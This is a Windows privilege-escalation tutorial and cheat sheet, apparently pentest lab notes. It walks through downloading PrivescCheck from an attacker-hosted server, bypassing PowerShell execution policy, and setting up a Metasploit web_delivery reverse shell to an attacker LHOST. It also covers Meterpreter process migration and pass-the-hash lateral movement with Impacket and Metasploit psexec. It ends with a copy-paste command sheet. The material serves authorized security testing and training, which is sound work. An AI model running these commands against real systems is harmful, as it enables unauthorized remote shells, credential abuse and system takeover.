# Windows Privilege Escalation 

> ⚠️ **Only for authorized testing.** These notes assume you are legally allowed to attack/test the systems in scope. Record everything, test PoCs in a lab, and never use these techniques on production without permission.

---

## Short definition 

**Windows Privilege Escalation** = the process of finding and exploiting weaknesses on a Windows host so an attacker or tester can gain **higher privileges** (e.g., from a regular user → Administrator → SYSTEM).

---

## 1) High-level workflow

1. Gather host info (OS build, hotfixes, installed software).
2. Run automated enumeration (PrivescCheck / winPEAS / PowerUp / JAWS).
3. Read results and identify candidates (writable services, weak scheduled tasks, vulnerable drivers, token theft, insecure permissions).
4. Test safe PoCs in lab, then execute targeted exploit (if allowed).
5. If credentials are found, use them to authenticate laterally (e.g., `psexec.py`, `smbexec`, `wmiexec`).
6. Document, and—if required—remove artifacts.

---

## 2) Automation: use PrivescCheck 

**Why automation?** Manual checks are slow and easy to miss; automation surfaces common vectors quickly.

* **PrivescCheck** — PowerShell script that enumerates local privilege escalation vectors.
  GitHub: `https://github.com/itm4n/PrivescCheck`

* **Alternatives / complements**

  * `winPEAS` / `winpeas.bat` (PowerShell/C#)
  * `PowerUp` (PowerShell)
  * `Seatbelt`, `Sherlock` (other helpers)

---

## 3) Getting PrivescCheck onto a Windows target

You asked: *How do I download from GitHub and make it executable on Windows (like `chmod +x` on Linux)?*
Windows doesn’t use `chmod`; you typically download the `.ps1` file and run it with PowerShell. Execution is controlled by PowerShell’s execution policy (not file permissions).

### Common ways to transfer the file (examples)

**A. Using PowerShell `Invoke-WebRequest` (recommended when PowerShell is allowed):**

```powershell
# Download raw script into Temp
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1' -OutFile 'C:\Windows\Temp\PrivescCheck.ps1'"
```

**B. Using CertUtil (native Windows binary download):**

```powershell
certutil -urlcache -f "https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1" C:\Windows\Temp\PrivescCheck.ps1
```

**C. Using a hosted Python HTTP server from attacker machine:**

```bash
# On attacker
python3 -m http.server 8080
# On target (PowerShell)
powershell -Command "Invoke-WebRequest -Uri 'http://<attacker-ip>:8080/PrivescCheck.ps1' -OutFile 'C:\Windows\Temp\PrivescCheck.ps1'"
```

---

## 4) Running PrivescCheck on the target

PowerShell execution policy may block scripts. Use the bypass flag to run one-off:

```powershell
# Dot-source & invoke (loads the script into current session then runs function)
powershell -ExecutionPolicy Bypass -NoProfile -Command ". 'C:\Windows\Temp\PrivescCheck.ps1'; Invoke-PrivescCheck"

# OR run directly
powershell -ExecutionPolicy Bypass -NoProfile -File 'C:\Windows\Temp\PrivescCheck.ps1'
```

* `-ExecutionPolicy Bypass` avoids the policy for this invocation.
* `-NoProfile` avoids loading user profiles (safer and quieter).
* If output is noisy, redirect to file:

  ```powershell
  powershell -ExecutionPolicy Bypass -NoProfile -Command ". 'C:\Windows\Temp\PrivescCheck.ps1'; Invoke-PrivescCheck" > C:\Windows\Temp\PrivescCheck-output.txt
  ```

**Run as Admin?** Some checks require elevated rights to access certain areas (e.g., SERVICE ACLs, secrets). If you don’t have admin, PrivescCheck will still show many useful vectors.

---

## 5) Interpreting results — common findings

Privesc tools report many things — prioritize:

* **Weak service executable permissions** (service binary writable by non-admin) → can replace binary and restart service.
* **Weak scheduled tasks** (task runs as SYSTEM and script/binary is writable) → replace script/binary.
* **Unquoted service paths** → DLL hijacking or executable path hijack.
* **Exposed credentials** in files (config, .xml, .git, wp-config.php).
* **Insecure permissions** on sensitive files (world-writeable).
* **Vulnerable drivers / old kernel** → local kernel exploits.
* **Service misconfigurations** (e.g., weak pipe ACLs).
* **WinLogon vulnerabilities / autologon credentials** — often easy wins.

If the script reports *credentials found*, use them carefully for lateral movement or local privilege escalation.

---

## 6) Example: using Metasploit `web_delivery` to get a shell (context from your lab)

You described using `exploit/multi/script/web_delivery` to host and deliver a PowerShell stager. Typical flow (conceptual):

```text
# In msfconsole
use exploit/multi/script/web_delivery
set TARGET 1                  # target index (PSH = PowerShell; exact index varies by version)
set PAYLOAD windows/shell/reverse_tcp
set LHOST 10.10.5.2           # where the reverse shell will connect
set PSH-EncodedCommand false  # do not base64-encode
exploit -j                    # run as a job (starts webserver)

# msf will print a PowerShell one-liner to run on victim. Paste it into victim cmd/powershell.
```

**Notes & tips**

* `TARGET` options change across versions; use `show targets` to see choices (`PSH`, `VBS`, etc.).
* If PowerShell is restricted, set `WIN_TRANSFER` or choose `VBS` payloads (msf can generate VBS, HTA, etc.).
* After victim runs the one-liner, a session appears in msfconsole; interact and `migrate` into `explorer.exe` or similar stable process. Then run enumeration scripts.

---

## 7) Migrating & elevating

You wrote about `migrate` → that’s correct. Typical pattern in Meterpreter:

```text
# after session opens
sysinfo
ps          # find explorer.exe PID (or other stable process)
migrate <PID-of-explorer>
getprivs    # check privileges (if any)
```

Migrating to `explorer.exe` (or other long-running process) reduces chance of losing session when the original process exits.

---

## 8) If PrivescCheck finds WinLogon / credentials

If the script reports credentials (plain or hashed), you can attempt to use them to access SMB/RPC services on the same host or other hosts.

### Example: Impacket `psexec.py` usage (lateral auth/execution)

> Tool: Impacket (examples repo) — `psexec.py` allows executing commands/services remotely using valid creds.

**With plaintext password:**

```bash
python3 /usr/share/doc/impacket/examples/psexec.py Administrator@<target-ip> -hashes '' -nooutput
# or
python3 psexec.py Administrator@<target-ip> <password>
```

**With NTLM hash (pass-the-hash)**:

```bash
python3 psexec.py Administrator@<target-ip> -hashes :<NTLM_HASH>
# Example
python3 psexec.py Administrator@10.10.10.5 -hashes :aad3b435b51404eeaad3b435b51404ee:8801...
```

**Or use Metasploit:**

```text
use exploit/windows/smb/psexec
set RHOSTS <target-ip>
set SMBUser Administrator
set SMBPass <password>
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <attacker-ip>
set LPORT 4444
exploit
```

> Always test `psexec` in a lab first — some environments log and alert.

---

## 9) Permissions & “chmod” question (Windows)

* **Linux:** `chmod +x script.sh` sets execute bits.
* **Windows:** No `chmod`; execution permission is governed by the NTFS ACL and file extension. To “make executable” on Windows:

  * Ensure file has an executable extension (`.exe`, `.ps1`, `.vbs`, `.bat`).
  * If ACLs block execution, change permissions using `icacls` (requires rights):

    ```powershell
    icacls C:\path\file /grant Everyone:RX
    ```
  * For PowerShell scripts, you control execution by PowerShell policy (use `-ExecutionPolicy Bypass` to run one-off).

---


---

## Quick copy-paste cheat sheet

```bash
# Download PrivescCheck (attacker -> victim)
# Option A: PowerShell (preferred)
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1' -OutFile 'C:\Windows\Temp\PrivescCheck.ps1'"

# Option B: CertUtil
certutil -urlcache -f "https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1" C:\Windows\Temp\PrivescCheck.ps1

# Run PrivescCheck (one-liner)
powershell -ExecutionPolicy Bypass -NoProfile -Command ". 'C:\Windows\Temp\PrivescCheck.ps1'; Invoke-PrivescCheck" > C:\Windows\Temp\PrivescCheck-output.txt

# msf web_delivery (attacker)
# in msfconsole:
use exploit/multi/script/web_delivery
set SRVHOST <attacker-IP>
set SRVPORT 8080
set TARGET 0            # check show targets (PSH/VBS/etc)
set PAYLOAD windows/shell/reverse_tcp
set LHOST <attacker-IP>
set PSH-EncodedCommand false
exploit -j

# Impacket psexec (attacker)
python3 /path/to/psexec.py Administrator@<target-ip> <password>
# or pass-the-hash:
python3 /path/to/psexec.py Administrator@<target-ip> -hashes :<NTLM_HASH>
```

---
